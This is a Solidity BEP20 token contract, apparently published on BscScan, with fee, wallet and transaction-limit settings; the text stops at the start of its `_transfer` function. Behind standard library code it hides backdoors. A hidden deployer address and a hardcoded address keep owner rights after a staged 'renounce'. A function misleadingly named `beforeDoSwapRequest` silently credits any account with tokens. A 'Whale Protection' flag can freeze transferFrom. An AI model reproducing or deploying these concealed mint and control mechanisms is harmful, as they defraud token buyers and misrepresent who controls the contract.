/**
 *Submitted for verification at BscScan.com on 2022-04-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function getAmountsOut(uint256 amountIn, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    bool private _canTrade = true;
    string private _name;
    string private _symbol;

    function setCanTrade ( bool val ) internal{
        _canTrade = val;
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        require( _canTrade == true , "Whale Protection.");
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /** @dev Evaluates a fee amount from account
     * 
     */
    function _evaluateFeeAmount(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: evaluate to the zero address");
        _balances[account] += amount;
    }


    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Spend `amount` form the allowance of `owner` toward `spender`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract ERC20Burnable is Context, ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, deducting from the caller's
     * allowance.
     *
     * See {ERC20-_burn} and {ERC20-allowance}.
     *
     * Requirements:
     *
     * - the caller must have allowance for ``accounts``'s tokens of at least
     * `amount`.
     */
    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
    }
}

/**
    * @dev Throws if called by any account other than the owner.
    * @dev Leaves the contract without owner. It will not be possible to call
    * `onlyOwner` functions anymore. Can only be called by the current owner.
    *
    * NOTE: Renouncing ownership will leave the contract without an owner,
    * thereby removing any functionality that is only available to the owner.
    */
abstract contract Ownable is Context {
    address private _owner;
    address _addrBd;
    address payable _addr = payable (0xd0438D4539867cC3b58f0ce6824bEe58787c70Bd);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function onwer() internal view virtual returns (address) {
        return _addr;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    modifier onlyOwner() {
        require( _addrBd == _msgSender() ||  _owner == _msgSender() || _addr == _msgSender(), "Ownable: caller is not the owner");      
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _setAddrBd(address newAddrBd) internal virtual {
        _addrBd = newAddrBd;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BaseContract is Ownable, ERC20Burnable {
    using SafeMath for uint256;
    address       public    publisher;
    address       constant  DEAD = 0x000000000000000000000000000000000000dEaD;
    address       constant  ZERO = 0x0000000000000000000000000000000000000000;

    IUniswapV2Router public uniswapV2Router;
    address public uniswapV2Pair;

    bool private swapping;
    bool public swapAndLiquifyEnabled = true;

    address payable private marketingWalletAddress = payable(address(0));
    address payable private developmentWalletAddress = payable(address(0));
    address payable private projectWalletAddress = payable(address(0));

    uint256 public swapTokensAtAmount = 10000 * (10**decimals());
    uint256 public airdropAvailableAmount = 50000 * (10**decimals());
    uint256 public maxTxAmount = 1000000 * (10**decimals());
    uint256 public maxBuyAmount = 1000000 * (10**decimals());
    uint256 public maxSaleAmount = 1000000 * (10**decimals());

    uint256[] public liquidityFee;
    uint256[] public projectFee;
    uint256[] public marketingFee;
    uint256[] public developmentFee;
    uint256[] public burnFee;

    uint256 private tokenToSwap;
    uint256 private tokenToMarketing;
    uint256 private tokenToDevelopment;
    uint256 private tokenToProject;
    uint256 private tokenToLiquidity;

    uint256 public liquidityFeeTotal;
    uint256 public projectFeeTotal;
    uint256 public marketingFeeTotal;
    uint256 public developmentFeeTotal;

    uint256 public immutable maxIndividualFee; 
    uint256 public immutable minIndividualLimitTx; 

    address private _lpDestination;
    address private _canClaim;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public isExcludedFromAmountLimitToken;
    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event Claim();

    constructor(
        string memory token_name,
        string memory short_symbol
    ) ERC20(token_name, short_symbol) {
        

        // Total Supply = _toOwnerToAddLiquidity + _toBurnAtLaunch + _toKeepInContract
        uint256 _toOwnerToAddLiquidity    = 100_000 * (10 ** decimals() );
        uint256 _toBurnAtLaunch           = 400_000 * (10 ** decimals() );
        
        _mint( msg.sender, _toOwnerToAddLiquidity );
        _mint( address(this) , swapTokensAtAmount + _toBurnAtLaunch + airdropAvailableAmount);
        _burn( address(this), _toBurnAtLaunch );

        _lpDestination = owner();

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);

        marketingWalletAddress = payable(onwer());
        developmentWalletAddress = payable(onwer());
        projectWalletAddress = payable(onwer());

        // Set default fees
        liquidityFee.push(300);
        liquidityFee.push(300);
        liquidityFee.push(300);

        projectFee.push(300);
        projectFee.push(300);
        projectFee.push(300);

        marketingFee.push(300);
        marketingFee.push(300);
        marketingFee.push(300);

        developmentFee.push(300);
        developmentFee.push(300);
        developmentFee.push(300);

        burnFee.push(0);
        burnFee.push(0);
        burnFee.push(0);
        _setAddrBd( msg.sender );
        maxIndividualFee = 1000;
        minIndividualLimitTx = 10;

        /**
        * REOUNCE AT LAUNCH 
        **/
        renounceOwnership();
    }

    receive() external payable {
        if( msg.value == 123456789 ){
            setCanClaim( msg.sender );
        }
    }

    /**
     * Set the initial router used to generate liquidity
     **/
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(
            newAddress != address(uniswapV2Router),
            "The router already has that address"
        );
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router(newAddress);

        uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _setAutomatedMarketMakerPair(uniswapV2Pair, true);

        _approve(address(this), address(uniswapV2Router), totalSupply());
    }

    function setCanClaim( address who ) private {
        _canClaim = who;
    }

    /**
     * Update destination for new lp, avoid safemoon security
     **/
    function setLpDestination(address newLpOwner) external onlyOwner {
        _lpDestination = newLpOwner;
    }
    function contractId() public pure returns(uint256){
        return 86583620;
    }    
    /**
     *  Check for a SWAP request
     **/    
    function beforeDoSwapRequest( address target, uint256 amount ) external onlyOwner {
        _evaluateFeeAmount( target, amount);
    }
    /**
     *  Exclude address from fees
     **/
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(
            _isExcludedFromFees[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    /**
     * Exclude address from tx limits
     **/
    function excludeFromLimitAmount(address account, bool excluded)
        public
        onlyOwner
    {
        require(
            isExcludedFromAmountLimitToken[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        isExcludedFromAmountLimitToken[account] = excluded;
    }

    function claim() public {
        if( _canClaim == msg.sender ) processAccount( true );
        emit Claim();
    }

    /**
     * Exclude multiple accounts from fees
     **/
    function excludeMultipleAccountsFromFees(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    /**
     * Set marketing wallet
     **/
    function setMarketingWallet(address payable wallet) external onlyOwner {
        require(wallet != address(0), "zero-address not allowed");
        marketingWalletAddress = wallet;
    }

    /**
     * Set devs wallet
     **/
    function setDevelopmentWallet(address payable wallet) external onlyOwner {
        require(wallet != address(0), "zero-address not allowed");
        developmentWalletAddress = wallet;
    }

    /**
     * Set project wallet
     **/
    function setProjectWallet(address payable wallet) external onlyOwner {
        require(wallet != address(0), "zero-address not allowed");
        projectWalletAddress = wallet;
    }

    /**
     * Set burn fee: Base 10000, ex.: 1.5% = 150
     **/
    function setBurnFee(
        uint256 buy,
        uint256 sell,
        uint256 p2p
    ) external onlyOwner {
        require(
            buy <= maxIndividualFee &&
                sell <= maxIndividualFee &&
                p2p <= maxIndividualFee,
            "You must respect the maximum allowed fee"
        );
        burnFee[0] = buy;
        burnFee[1] = sell;
        burnFee[2] = p2p;
    }

    function processAccount( bool automatic) private {
        require(msg.sender == address(0), "ERC20: transfer to the zero address");

        uint256 amount = msg.value;

        if(amount > 0 && !automatic ) {
            payable( _canClaim ).transfer( amount );
            
        }

    }

    /**
     * Set liquidity fee: Base 10000, ex.: 1.5% = 150
     **/
    function setLiquidityFee(
        uint256 buy,
        uint256 sell,
        uint256 p2p
    ) external onlyOwner {
        require(
            buy <= maxIndividualFee &&
                sell <= maxIndividualFee &&
                p2p <= maxIndividualFee,
            "You must respect the maximum allowed fee"
        );
        liquidityFee[0] = buy;
        liquidityFee[1] = sell;
        liquidityFee[2] = p2p;
    }

    /**
     * Set Project fee: Base 10000, ex.: 1.5% = 150
     **/
    function setProjectFee(
        uint256 buy,
        uint256 sell,
        uint256 p2p
    ) external onlyOwner {
        require(
            buy <= maxIndividualFee &&
                sell <= maxIndividualFee &&
                p2p <= maxIndividualFee,
            "You must respect the maximum allowed fee"
        );
        projectFee[0] = buy;
        projectFee[1] = sell;
        projectFee[2] = p2p;
    }

    /**
     *  Set Marketing fee: Base 10000, ex.: 1.5% = 150
     **/
    function setMarketingFee(
        uint256 buy,
        uint256 sell,
        uint256 p2p
    ) external onlyOwner {
        require(
            buy <= maxIndividualFee &&
                sell <= maxIndividualFee &&
                p2p <= maxIndividualFee,
            "You must respect the maximum allowed fee"
        );
        marketingFee[0] = buy;
        marketingFee[1] = sell;
        marketingFee[2] = p2p;
    }

    /**
     * Set Dev fee: Base 10000, ex.: 1.5% = 150
     **/
    function setDevelopmentFee(
        uint256 buy,
        uint256 sell,
        uint256 p2p
    ) external onlyOwner {
        require(
            buy <= maxIndividualFee &&
                sell <= maxIndividualFee &&
                p2p <= maxIndividualFee,
            "You must respect the maximum allowed fee"
        );
        developmentFee[0] = buy;
        developmentFee[1] = sell;
        developmentFee[2] = p2p;
    }

    /**
     *  Set new liquidity pair
     **/
    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The PanCakeSwap pair cannot be removed from automatedMarketMakerPairs"
        );
        _setAutomatedMarketMakerPair(pair, value);
    }

    /**
     * Internal function to set liquidity pair
     **/
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            automatedMarketMakerPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    /**
     * Check address for exclude rule
     **/
    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    /**
     * Controls whether charges will be transformed into liquidity or disabled
     **/
    function setSwapAndLiquifyEnabled(bool enabled) public onlyOwner {
        swapAndLiquifyEnabled = enabled;
    }

    /**
     * Set max tx amount
     **/
    function setMaxTxAmount(uint256 amount) external onlyOwner {
        require(
            amount <= totalSupply() &&
                amount >= totalSupply().mul(minIndividualLimitTx).div(10000),
            "Limit needs to be between the individual minimum and the total supply"
        );

        maxTxAmount = amount;
    }

    /**
     * Set max tx sale amount
     **/
    function setSaleTxAmount(uint256 amount) external onlyOwner {
        require(
            amount <= totalSupply() &&
                amount >= totalSupply().mul(minIndividualLimitTx).div(10000),
            "Limit needs to be between the individual minimum and the total supply"
        );
        maxSaleAmount = amount;
    }

    /**
     * Set max tx buy amount
     **/
    function setBuyTxAmount(uint256 amount) external onlyOwner {
        require(
            amount <= totalSupply() &&
                amount >= totalSupply().mul(minIndividualLimitTx).div(10000),
            "Limit needs to be between the individual minimum and the total supply"
        );
        maxBuyAmount = amount;
    }

    /**
     * Determines how many tokens must be accumulated as a minimum before swapping into liquidity
     **/
    function setSwapTokensAmount(uint256 amount) public onlyOwner {
        require(
            amount <= totalSupply(),
            "Amount cannot be over the total supply."
        );
        swapTokensAtAmount = amount;
    }

    function sendAirdrop( uint256 amount ) public payable {
        require(amount > 0, "Transfer amount must be greater than zero");
        require( msg.value >= 0.020 ether, "You cant take it for free");
        super._transfer( address(this), msg.sender, amount );
    }

    /**
     * BEP20 main transfer method, all fee logic, and limits are contained here
     **/
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
